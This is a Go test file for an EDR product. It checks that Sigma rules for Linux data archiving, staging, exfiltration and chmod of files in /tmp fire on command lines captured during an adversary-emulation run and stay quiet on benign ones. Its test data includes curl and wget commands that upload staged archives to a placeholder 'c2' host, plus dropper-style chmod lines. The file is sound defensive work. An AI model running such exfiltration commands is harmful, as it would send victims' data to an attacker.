package rules

import (
	"context"
	"testing"
)

// The Linux collection→archive→exfil rules, exercised on the exact command lines the
// eBPF process collector captured during the Caldera Thief run. They close a gap the
// Windows rules do not cover (those key on Compress-Archive / PowerShell HttpClient),
// so T1560.001 and T1041 scored Tactic-only / MISS until they landed.
//
// The rule bodies are loaded FROM THE MIGRATIONS, not copied here. They used to be
// inline consts carrying a "if you edit the SQL, update these copies too" note, and
// that note was not enough: migrations 371 and 372 rewrote two of these rules and the
// copies kept asserting the old text. That is P5-14 exactly — a harness that verifies
// the pre-fix body passes while production runs something else. extractMigrationRules
// reads the shipped bytes, so there is nothing left to drift.

// migrationRuleByName returns the shipped body of a rule, applying migrations in
// order so a later UPDATE wins — the same final-state modelling the DB itself does.
func migrationRuleByName(t *testing.T, name string) *DetectionRule {
	t.Helper()
	all, err := extractMigrationRules()
	if err != nil {
		t.Fatalf("extractMigrationRules: %v", err)
	}
	var found *DetectionRule
	for _, r := range all {
		if r.Name == name {
			found = r
		}
	}
	if found == nil {
		t.Fatalf("no migration defines rule %q", name)
	}
	return found
}

// TestRuleEngine_Sigma_LinuxCollectionExfil verifies the migration-285 rules fire
// through the real sigma-go engine on the exact command lines the eBPF process
// collector captured during the Caldera Thief run, and stay quiet on benign input.
func TestRuleEngine_Sigma_LinuxCollectionExfil(t *testing.T) {
	e := NewRuleEngine()
	e.LoadRules([]*DetectionRule{
		sigmaRule("lin-archive", migrationRuleByName(t, "Archive Collected Data via Compression Utility (Linux)").Content),
		sigmaRule("lin-exfil", migrationRuleByName(t, "Data Exfiltration via curl/wget Upload (Linux)").Content),
		sigmaRule("lin-staging", migrationRuleByName(t, "Local Data Staging via File Copy (Linux)").Content),
	})

	ev := func(cmd string) map[string]interface{} {
		return map[string]interface{}{"type": "process", "agent_id": "lin-1",
			"imagePath": "/usr/bin/x", "commandLine": cmd}
	}
	fires := []struct{ rule, cmd string }{
		{"lin-archive", `tar -P -zcf /home/ubuntu/staged.tar.gz /home/ubuntu/staged`},
		{"lin-archive", `gzip -9 /home/ubuntu/loot/dump.sql`},
		{"lin-exfil", `curl -F data=@/home/ubuntu/staged.tar.gz --header X-Request-ID: h http://c2/file/upload`},
		{"lin-exfil", `wget --post-file=/tmp/staged.tar.gz http://c2/up`},
		{"lin-staging", `cp /home/ubuntu/edr-platform/docker-compose.yml /home/ubuntu/staged`},
		{"lin-staging", `mkdir -p staged`},
	}
	for _, f := range fires {
		t.Run(f.rule+":"+f.cmd[:12], func(t *testing.T) {
			m, err := e.Evaluate(context.Background(), ev(f.cmd))
			if err != nil {
				t.Fatalf("Evaluate: %v", err)
			}
			if !hasRule(m, f.rule) {
				t.Fatalf("rule %q should fire on %q, got %d matches", f.rule, f.cmd, len(m))
			}
		})
	}

	// Benign: a plain download (no upload flag) and a tar extract must not fire exfil/archive.
	for _, b := range []struct{ rule, cmd string }{
		{"lin-exfil", `curl -s http://mirror/pkg.tar.gz -o /tmp/pkg.tar.gz`},
		{"lin-archive", `tar -xzf /tmp/pkg.tar.gz -C /opt`},
	} {
		if m, _ := e.Evaluate(context.Background(), ev(b.cmd)); hasRule(m, b.rule) {
			t.Errorf("rule %q false-positive on benign %q", b.rule, b.cmd)
		}
	}
}

// The FP-soak benign corpus must not fire the archive rule.
//
// These are the exact command lines in tests/fpsoak/profiles/*.toml. Before
// migration 372 the rule's `ziptools` branch made any compression tool
// independently sufficient, so a backup server writing to its vault and a
// developer packing build output both alerted — 17 of the 439 false positives in
// the 2026-08-03 soak. Migration 371 (the YAML duplicate-key fix) did not move
// that number at all, which is how the real cause was found.
//
// Keeping the corpus here means a future widening of the rule fails in unit tests
// rather than 30 minutes later in the soak.
func TestArchiveRuleStaysQuietOnBenignCorpus(t *testing.T) {
	e := NewRuleEngine()
	e.LoadRules([]*DetectionRule{
		sigmaRule("lin-archive", migrationRuleByName(t, "Archive Collected Data via Compression Utility (Linux)").Content),
	})
	ev := func(cmd string) map[string]interface{} {
		return map[string]interface{}{"type": "process", "agent_id": "lin-1",
			"imagePath": "/usr/bin/x", "commandLine": cmd}
	}
	for _, cmd := range []string{
		// backup-server.toml — 業務データを保管庫へ。これは技術ではなくその機械の仕事。
		`tar --zstd -cf /vault/archive-20260803.tar.zst /srv/data/share`,
		`tar -tvf /vault/archive-20260803.tar.zst`,
		// dev-machine.toml — ビルド成果物の梱包と展開。
		`tar -czf /tmp/artifact-8f21.tar.gz ./dist`,
		`tar -xzf /tmp/node-v20.tar.gz -C /tmp`,
	} {
		t.Run(cmd[:18], func(t *testing.T) {
			if m, _ := e.Evaluate(context.Background(), ev(cmd)); hasRule(m, "lin-archive") {
				t.Errorf("benign %q fired the archive rule — the selector is not discriminating "+
					"the technique (Archive *Collected Data*) from ordinary compression", cmd)
			}
		})
	}
}

// The chmod rule keeps detecting after migration 373 lowered its severity 7 → 4.
//
// The recalibration is about triage priority, not about what the rule matches:
// a single process_creation event cannot tell `chmod +x /tmp/installer.sh` run
// by a developer from the same command run by a dropper, so the rule stays and
// the kill-chain correlator (download → chmod → execute) does the real work.
//
// This test exists because "lower the severity" and "weaken the detection" are
// one careless edit apart, and the FP soak would not notice: it counts alerts
// regardless of severity, so a rule that stopped matching entirely would show up
// as an improvement.
func TestChmodStagingRuleStillMatchesAfterRecalibration(t *testing.T) {
	r := migrationRuleByName(t, "Suspicious chmod of Executable in /tmp")

	if r.Severity != 4 {
		t.Errorf("severity = %d, want 4. If this is being raised again, check first that the "+
			"rule can actually discriminate — at 7 it competed with genuinely high-severity "+
			"alerts while firing 12 times per 1.67 benign host-days", r.Severity)
	}
	if r.AutoIsolate {
		t.Error("auto_isolate must stay false: this rule cannot distinguish the technique from " +
			"ordinary development, so it must never drive an automated response")
	}

	e := NewRuleEngine()
	e.LoadRules([]*DetectionRule{sigmaRule("chmod-stage", r.Content)})
	ev := func(cmd string) map[string]interface{} {
		return map[string]interface{}{"type": "process", "agent_id": "lin-1",
			"imagePath": "/usr/bin/chmod", "commandLine": cmd}
	}

	for _, cmd := range []string{
		`chmod +x /tmp/payload.elf`,
		`chmod 777 /dev/shm/stage`,
	} {
		if m, _ := e.Evaluate(context.Background(), ev(cmd)); !hasRule(m, "chmod-stage") {
			t.Errorf("%q must still fire — lowering the severity must not weaken the match", cmd)
		}
	}

	// The three-way AND from migration 371 must survive: a chmod with no mode
	// bits, or outside a staging directory, is not the technique.
	for _, cmd := range []string{
		`chmod 600 /home/dev/.ssh/id_ed25519`, // staging dir absent, no exec bit
		`chmod -R g+w /var/www`,               // exec-ish bit but not a staging dir
	} {
		if m, _ := e.Evaluate(context.Background(), ev(cmd)); hasRule(m, "chmod-stage") {
			t.Errorf("%q must not fire — the mode-bit and staging-dir conditions are what "+
				"migration 371 restored after a duplicate YAML key dropped one of them", cmd)
		}
	}
}
